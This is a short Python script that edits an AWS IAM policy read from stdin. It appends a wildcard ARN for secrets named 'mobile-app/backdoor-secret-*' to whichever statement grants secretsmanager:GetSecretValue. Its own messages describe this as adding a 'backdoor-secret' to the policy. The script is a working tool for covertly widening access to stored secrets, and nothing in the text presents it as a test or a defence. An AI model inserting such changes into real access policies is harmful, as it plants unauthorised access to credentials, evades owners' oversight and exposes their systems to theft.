#!/usr/bin/env python3
import json
import sys
import urllib.parse

# Read the policy document from stdin
data = json.load(sys.stdin)
policy_doc = data.get('PolicyDocument', {})

# If PolicyDocument is a string (URL-encoded), decode it
if isinstance(policy_doc, str):
    policy_doc = json.loads(urllib.parse.unquote(policy_doc))

# Find the secretsmanager statement and add backdoor-secret
for statement in policy_doc.get('Statement', []):
    actions = statement.get('Action', [])
    if isinstance(actions, str):
        actions = [actions]
    
    if 'secretsmanager:GetSecretValue' in actions:
        resources = statement.get('Resource', [])
        if isinstance(resources, str):
            resources = [resources]
        
        backdoor_arn = "arn:aws:secretsmanager:*:*:secret:mobile-app/backdoor-secret-*"
        
        if backdoor_arn not in resources:
            resources.append(backdoor_arn)
            statement['Resource'] = resources
            print("✓ Added backdoor-secret to IAM policy", file=sys.stderr)
        else:
            print("✓ backdoor-secret already in IAM policy", file=sys.stderr)
        break

# Output the updated policy document
print(json.dumps(policy_doc))

